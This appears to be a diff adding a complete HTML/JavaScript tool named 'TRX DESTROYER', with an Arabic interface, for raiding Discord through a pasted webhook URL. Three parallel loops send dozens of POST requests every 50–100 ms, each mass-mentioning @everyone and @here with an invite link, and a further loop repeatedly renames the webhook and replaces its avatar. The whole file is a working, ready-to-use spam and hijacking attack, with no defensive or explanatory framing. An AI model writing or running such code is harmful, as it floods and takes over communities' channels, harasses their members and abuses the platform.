@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRX ☣️ · DESTROYER</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #0a0a0a; color: #fff;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; margin: 0;
+        }
+        .box {
+            background: #111;
+            border: 1px solid #2a2a2a;
+            border-radius: 30px; padding: 40px;
+            width: 520px; max-width: 95%; text-align: center;
+        }
+        h1 { color: #ff1a1a; letter-spacing: 5px; margin: 0 0 5px; font-size: 42px; }
+        .sub { color: #555; font-size: 12px; margin: 0 0 20px; letter-spacing: 3px; }
+        input, textarea {
+            width: 100%; padding: 15px 20px; box-sizing: border-box;
+            background: #1a1a1a; border: 1px solid #333;
+            border-radius: 30px; color: #fff; font-size: 14px;
+            direction: ltr; text-align: left; outline: none;
+            font-family: inherit;
+        }
+        input:focus { border-color: #ff1a1a; }
+        .row { display: flex; gap: 10px; margin: 20px 0; }
+        .b1 {
+            flex: 1; padding: 16px; background: #cc0000; color: #fff;
+            border: none; border-radius: 30px; font-size: 16px;
+            font-weight: 700; cursor: pointer; letter-spacing: 3px;
+            transition: 0.2s;
+        }
+        .b1:hover:not(:disabled) { background: #ff1a1a; transform: scale(1.02); }
+        .b1:disabled { opacity: 0.3; cursor: not-allowed; }
+        .b2 {
+            flex: 1; padding: 16px; background: #222; color: #888;
+            border: 1px solid #444; border-radius: 30px; font-size: 16px;
+            font-weight: 700; cursor: pointer; letter-spacing: 3px;
+            transition: 0.2s;
+        }
+        .b2:hover:not(:disabled) { background: #cc0000; color: #fff; border-color: #cc0000; }
+        .b2:disabled { opacity: 0.3; cursor: not-allowed; }
+        .stat { color: #888; font-size: 14px; margin: 5px 0; }
+        #cnt { color: #00ff88; font-size: 28px; font-weight: 700; }
+        #log {
+            width: 100%; height: 180px; margin-top: 12px;
+            background: #050505; color: #00ff88;
+            border: 1px solid #2a2a2a; border-radius: 16px;
+            padding: 15px; font-family: 'Courier New', monospace; font-size: 12px;
+            direction: ltr; text-align: left; resize: none; overflow-y: auto;
+        }
+        .badge { color: #ff1a1a; font-size: 11px; margin-top: 10px; letter-spacing: 2px; opacity: 0.6; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h1>☠️ TRX</h1>
+    <p class="sub">● @everyone + اسم TRX ☣️ + صوره ●</p>
+    <input type="text" id="wh" placeholder="https://discord.com/api/webhooks/...">
+    <div class="row">
+        <button class="b1" id="go" onclick="START()">💀 ابدأ</button>
+        <button class="b2" id="stp" onclick="STOP()" disabled>⛔ إيقاف</button>
+    </div>
+    <div class="stat">الرسائل المرسلة:</div>
+    <div id="cnt">0</div>
+    <textarea id="log" readonly placeholder="..."></textarea>
+    <div class="badge">● TRX ☣️ HUB ●</div>
+</div>
+
+<script>
+let running = false, stopped = false, sent = 0, allTimers = [];
+
+function $(id) { return document.getElementById(id); }
+
+function log(msg) {
+    const el = $('log');
+    const time = new Date().toLocaleTimeString('ar-SA');
+    el.value += `[${time}] ${msg}\n`;
+    el.scrollTop = el.scrollHeight;
+}
+
+const AVATAR_URL = 'https://github.com/Rxz60/MR-HUB/raw/refs/heads/main/IMG_5011.jpeg';
+
+async function sendMsg(wh, text) {
+    if (stopped) return;
+    try {
+        await fetch(wh, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: text,
+                username: '☣️ TRX HUB ☣️',
+                avatar_url: AVATAR_URL   
+            })
+        });
+        sent++;
+        $('cnt').textContent = sent;
+    } catch (e) {}
+}
+
+async function renameAndAvatarBot(wh) {
+    if (stopped) return;
+    try {
+        await fetch(wh, {
+            method: 'PATCH',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                name: '☣️ ROOM TRX HUB ☣️',
+                avatar: AVATAR_URL   
+            })
+        });
+    } catch (e) {}
+}
+
+function roomLoop1(wh, txt) {
+    if (stopped) return;
+    for (let i = 0; i < 30; i++) sendMsg(wh, txt);
+    const t = setTimeout(() => roomLoop1(wh, txt), 50);
+    allTimers.push(t);
+}
+
+function roomLoop2(wh, txt) {
+    if (stopped) return;
+    for (let i = 0; i < 25; i++) sendMsg(wh, txt);
+    const t = setTimeout(() => roomLoop2(wh, txt), 75);
+    allTimers.push(t);
+}
+
+function roomLoop3(wh, txt) {
+    if (stopped) return;
+    for (let i = 0; i < 25; i++) sendMsg(wh, txt);
+    const t = setTimeout(() => roomLoop3(wh, txt), 100);
+    allTimers.push(t);
+}
+
+function patchLoop(wh) {
+    if (stopped) return;
+    renameAndAvatarBot(wh);
+    const t = setTimeout(() => patchLoop(wh), 3000);
+    allTimers.push(t);
+}
+
+function START() {
+    const wh = $('wh').value.trim();
+    if (!wh) { alert('⚠️ حط رابط Webhook أول!'); return; }
+    if (running) return;
+
+    running = true; stopped = false; sent = 0;
+    allTimers = [];
+    $('cnt').textContent = '0';
+    $('go').disabled = true;
+    $('stp').disabled = false;
+    $('log').value = '';
+
+    log('🚀 بدء الهجوم السريع — TRX ☣️ DESTROYER');
+    log('📌 اسم الروم/المُرسل: ☣️ ROOM TRX HUB ☣️');
+    log('📌 الرسالة: TRX - https://discord.gg/SAP');
+    log('⚠️ تكرار مستمر وبسرعة فائقة');
+
+    const msg = '☣️ ROOM TRX HUB ☣️\nTRX - https://discord.gg/SAP\n@everyone @here';
+    
+    roomLoop1(wh, msg);
+    roomLoop2(wh, msg);
+    roomLoop3(wh, msg);
+    patchLoop(wh);
+
+    const report = setInterval(() => {
+        if (stopped) { clearInterval(report); return; }
+        log(`📊 إجمالي العمليات: ${sent}`);
+    }, 4000);
+    allTimers.push(report);
+
+    setTimeout(() => renameAndAvatarBot(wh), 200);
+}
+
+function STOP() {
+    if (!running) return;
+    log('⛔ جاري الإيقاف...');
+    stopped = true;
+    for (const t of allTimers) clearTimeout(t);
+    allTimers = [];
+    setTimeout(() => {
+        running = false;
+        $('go').disabled = false;
+        $('stp').disabled = true;
+        log(`🛑 توقف. المجموع: ${sent} رسالة`);
+    }, 300);
+}
+</script>
+</body>
+</html>
